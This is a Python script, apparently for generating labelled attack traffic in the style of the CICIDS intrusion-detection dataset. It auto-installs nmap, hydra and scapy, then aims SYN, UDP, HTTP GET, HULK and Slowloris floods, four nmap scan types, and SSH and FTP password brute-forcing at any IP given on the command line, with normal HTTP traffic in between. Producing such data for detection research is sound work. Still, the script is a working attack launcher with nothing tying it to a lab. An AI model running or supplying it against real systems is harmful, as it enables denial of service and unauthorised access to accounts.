#!/usr/bin/env python3
# traffic.py <TARGET_IP>
# One-command traffic generator: auto-installs dependencies, then runs
# a mix of normal traffic + attacks. Run: sudo python3 traffic.py <TARGET_IP>
#
# NOTE: attack scripts (syn_flood.py, udp_flood.py, http_get_flood.py,
#       hulk.py, slowloris.py, ftp_patator.py) and passwords.txt must be
#       in the SAME folder as this file.

import subprocess
import shutil
import sys
import time
import os

if len(sys.argv) != 2:
    print(f"Usage: sudo python3 {sys.argv[0]} <TARGET_IP>")
    sys.exit(1)

TARGET_IP = sys.argv[1]
HTTP_PORT = 80
UDP_PORT = 53
SSH_PORT = 22
FTP_PORT = 21
NORMAL_REQUEST_COUNT = 200


# ============================================================
# 0. auto-install dependencies (so the user only runs this one file)
# ============================================================
def ensure_apt(pkg, check_cmd=None):
    cmd = check_cmd or pkg
    if shutil.which(cmd):
        return
    print(f"[setup] installing {pkg} ...")
    subprocess.run(["apt-get", "install", "-y", pkg], check=False,
                   stdout=subprocess.DEVNULL)


def ensure_pip(module, pip_name=None):
    name = pip_name or module
    try:
        __import__(module)
    except ImportError:
        print(f"[setup] pip installing {name} ...")
        subprocess.run([sys.executable, "-m", "pip", "install", name,
                        "--break-system-packages"], check=False,
                       stdout=subprocess.DEVNULL)


def setup_dependencies():
    print("[setup] checking dependencies...")
    # command-line tools
    ensure_apt("nmap")
    ensure_apt("hydra")
    # python modules
    ensure_pip("requests")
    ensure_pip("scapy")
    print("[setup] dependencies ready\n")


# import requests AFTER ensuring it is installed
setup_dependencies()
import requests  # noqa: E402


def generate_normal_http_traffic(count):
    print(f"\n[+] Starting normal HTTP traffic: {count} requests")
    success = 0
    failed = 0
    for index in range(1, count + 1):
        try:
            response = requests.get(
                f"http://{TARGET_IP}:{HTTP_PORT}/",
                headers={"Connection": "close"},
                timeout=2,
            )
            if response.status_code < 500:
                success += 1
            else:
                failed += 1
        except requests.RequestException:
            failed += 1
        if index % 50 == 0 or index == count:
            print(f"[*] HTTP progress: {index}/{count} "
                  f"success={success} failed={failed}")
        time.sleep(0.05)
    print("[+] Normal HTTP traffic completed")


def run_command(name, command):
    print(f"\n[+] Starting {name}")
    result = subprocess.run(command, check=False)
    if result.returncode == 0:
        print(f"[+] {name} completed")
    else:
        print(f"[-] {name} failed with exit code {result.returncode}")


# ============================================================
# attack sequence (normal traffic interleaved between attacks)
# ============================================================
generate_normal_http_traffic(NORMAL_REQUEST_COUNT)
run_command("SYN flood",
            ["python3", "syn_flood.py", TARGET_IP, str(HTTP_PORT)])

generate_normal_http_traffic(NORMAL_REQUEST_COUNT)
run_command("UDP flood",
            ["python3", "udp_flood.py", TARGET_IP, str(UDP_PORT)])

generate_normal_http_traffic(NORMAL_REQUEST_COUNT)
run_command("HTTP GET flood",
            ["python3", "http_get_flood.py", TARGET_IP, str(HTTP_PORT)])

generate_normal_http_traffic(NORMAL_REQUEST_COUNT)
run_command("HULK (cache-bypass flood)",
            ["python3", "hulk.py", TARGET_IP, str(HTTP_PORT), "15"])

generate_normal_http_traffic(NORMAL_REQUEST_COUNT)
run_command("Slowloris (slow DoS)",
            ["python3", "slowloris.py", TARGET_IP, str(HTTP_PORT), "20"])

# --- port scans: several scan types for variety (all labeled PortScan in CICIDS) ---
generate_normal_http_traffic(NORMAL_REQUEST_COUNT)
run_command("Nmap SYN scan",
            ["nmap", "-sS", "-p", "1-1000", TARGET_IP])
run_command("Nmap FIN scan",
            ["nmap", "-sF", "-p", "1-1000", TARGET_IP])
run_command("Nmap NULL scan",
            ["nmap", "-sN", "-p", "1-1000", TARGET_IP])
run_command("Nmap XMAS scan",
            ["nmap", "-sX", "-p", "1-1000", TARGET_IP])

generate_normal_http_traffic(NORMAL_REQUEST_COUNT)
run_command("SSH brute-force (SSH-Patator)",
            ["hydra", "-l", "test", "-P", "passwords.txt",
             "-s", str(SSH_PORT), f"ssh://{TARGET_IP}"])

generate_normal_http_traffic(NORMAL_REQUEST_COUNT)
run_command("FTP brute-force (FTP-Patator)",
            ["python3", "ftp_patator.py", TARGET_IP, str(FTP_PORT)])

generate_normal_http_traffic(NORMAL_REQUEST_COUNT)
print("\n[+] All traffic generation tasks completed")
